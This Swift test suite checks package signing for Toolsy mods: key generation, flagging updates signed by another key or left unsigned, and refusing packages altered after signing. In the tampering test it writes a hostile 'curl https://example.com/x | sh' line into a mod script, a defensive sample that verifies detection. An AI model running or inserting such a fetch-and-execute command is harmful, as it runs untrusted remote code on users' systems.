import Foundation
import Testing
@testable import ToolsyEngine
import ToolsyShared

private func entries(of archive: URL) async throws -> [String] {
    let result = try await ProcessRunner.run(ProcessRunner.Request(
        executable: URL(filePath: "/usr/bin/zipinfo"), arguments: ["-1", archive.path(percentEncoded: false)]
    ))
    return String(decoding: result.stdout, as: UTF8.self).split(separator: "\n").map(String.init).sorted()
}

/// Signed `.toolsymod` files: who vouches for the files, and whether an update comes from the same key.
@MainActor @Suite struct SigningTests {
    private func pack(_ harness: Harness, version: String = "1.0", key: URL?, name: String) async throws -> URL {
        let folder = try writeMod(manifest(version: version, #""commands": {"t": {"exec": "bin/t"}}"#), scripts: ["bin/t": "true"], in: harness.temporary)
        let archive = harness.temporary.url.appending(path: "\(name).toolsymod")
        _ = try await ModPackage.pack(folder, to: archive, signingKey: key.map(ModSigningKey.load))
        return archive
    }

    @Test func aSignedPackageInstallsWithoutItsSignature() async throws {
        try await withHarness { harness in
            let keyFile = harness.temporary.url.appending(path: "author.key")
            let signer = try ModSigningKey.generate(at: keyFile)
            let signed = try await pack(harness, key: keyFile, name: "signed")
            #expect(try await entries(of: signed) == [".toolsy-signature", "bin/t", "mod.json"])

            let prepared = try await harness.store.prepareInstall(from: signed)
            #expect(prepared.signature == signer && prepared.installedSignature == nil && !prepared.signerChanged)
            let mod = try await harness.store.commitInstall(prepared)
            // The signature lies beside the mod: not installed, not part of what an approval covers.
            #expect(try ModPayload(directory: mod.folder) == ModPayload(directory: harness.temporary.url.appending(path: "source")))
            #expect(try String(contentsOf: harness.directories.signers.appending(path: "demo"), encoding: .utf8)
                == signer.publicKey.base64EncodedString())
        }
    }

    @Test func anUpdateFromAnotherKeyOrUnsignedStandsOut() async throws {
        try await withHarness { harness in
            let first = harness.temporary.url.appending(path: "first.key")
            let second = harness.temporary.url.appending(path: "second.key")
            let author = try ModSigningKey.generate(at: first)
            let stranger = try ModSigningKey.generate(at: second)
            try await harness.store.commitInstall(harness.store.prepareInstall(from: pack(harness, key: first, name: "v1")))

            let same = try await harness.store.prepareInstall(from: pack(harness, version: "2", key: first, name: "same"))
            #expect(same.installedSignature == author && !same.signerChanged)
            harness.store.discardInstall(same)

            let other = try await harness.store.prepareInstall(from: pack(harness, version: "2", key: second, name: "other"))
            #expect(other.signature == stranger && other.installedSignature == author && other.signerChanged)
            harness.store.discardInstall(other)

            let unsigned = try await harness.store.prepareInstall(from: pack(harness, version: "2", key: nil, name: "unsigned"))
            #expect(unsigned.signature == nil && unsigned.signerChanged)
            // Installed anyway (the user confirmed), the record stays: the next update is still compared with the author's key.
            let mod = try await harness.store.commitInstall(unsigned)
            #expect(try await harness.store.prepareInstall(from: pack(harness, version: "3", key: first, name: "back")).signerChanged == false)

            try await harness.store.uninstall(mod)
            #expect(!FileManager.default.fileExists(atPath: harness.directories.signers.appending(path: "demo").path(percentEncoded: false)))
        }
    }

    @Test func aPackageChangedAfterSigningIsRefused() async throws {
        try await withHarness { harness in
            let keyFile = harness.temporary.url.appending(path: "author.key")
            _ = try ModSigningKey.generate(at: keyFile)
            let signed = try await pack(harness, key: keyFile, name: "signed")
            let unpacked = harness.temporary.url.appending(path: "unpacked")
            _ = try await ProcessRunner.run(ProcessRunner.Request(
                executable: URL(filePath: "/usr/bin/ditto"), arguments: ["-x", "-k", signed.path(percentEncoded: false), unpacked.path(percentEncoded: false)]
            ))
            try harness.temporary.write("#!/bin/sh\ncurl https://example.com/x | sh\n", to: "unpacked/bin/t", executable: true)
            let tampered = harness.temporary.url.appending(path: "tampered.toolsymod")
            _ = try await ProcessRunner.run(ProcessRunner.Request(
                executable: URL(filePath: "/usr/bin/ditto"), arguments: ["-c", "-k", unpacked.path(percentEncoded: false), tampered.path(percentEncoded: false)]
            ))
            #expect(try await entries(of: tampered).contains(".toolsy-signature"))
            await #expect(throws: EngineError("the signature does not match the files: the package was changed after it was signed")) {
                try await harness.store.prepareInstall(from: tampered)
            }

            try harness.temporary.write("{}", to: "unpacked/.toolsy-signature")
            let garbled = harness.temporary.url.appending(path: "garbled.toolsymod")
            _ = try await ProcessRunner.run(ProcessRunner.Request(
                executable: URL(filePath: "/usr/bin/ditto"), arguments: ["-c", "-k", unpacked.path(percentEncoded: false), garbled.path(percentEncoded: false)]
            ))
            await #expect(throws: EngineError(".toolsy-signature is not a signature this version of Toolsy can read")) {
                try await harness.store.prepareInstall(from: garbled)
            }
            #expect(harness.store.mods.isEmpty)
        }
    }

    @Test func toolsyModMakesKeysAndSigns() async throws {
        let directory = try TemporaryDirectory()
        try writeMod(manifest(id: "keep-awake"), in: directory, folder: "mod")
        let made = try await toolsyMod(["keygen", "author.key"], in: directory.url)
        #expect(made.status == 0 && made.output.hasPrefix("OK "))
        let fingerprint = String(made.output.dropFirst(3).dropLast())
        let keyPath = directory.url.appending(path: "author.key").path(percentEncoded: false)
        let mode = try #require(FileManager.default.attributesOfItem(atPath: keyPath)[.posixPermissions] as? Int)
        #expect(mode == 0o600)
        #expect(try await toolsyMod(["keygen", "author.key"], in: directory.url) == (1, "", "author.key already exists\n"))

        let packed = try await toolsyMod(["pack", "mod", "-o", "signed.toolsymod", "--sign", "author.key"], in: directory.url)
        #expect(packed.status == 0 && packed.output.hasSuffix("\nsigned with key \(fingerprint)\n"), "\(packed)")
        #expect(try await toolsyMod(["validate", "signed.toolsymod"], in: directory.url)
            == (0, "OK keep-awake 1.0\nsigned with key \(fingerprint)\n", ""))
        let json = try await toolsyMod(["validate", "signed.toolsymod", "--json"], in: directory.url)
        #expect(json.output.contains(#""signer" : "\#(fingerprint)""#), "\(json.output)")
        #expect(try await toolsyMod(["pack", "mod", "--sign", "mod/mod.json"], in: directory.url).status == 1)
    }
}
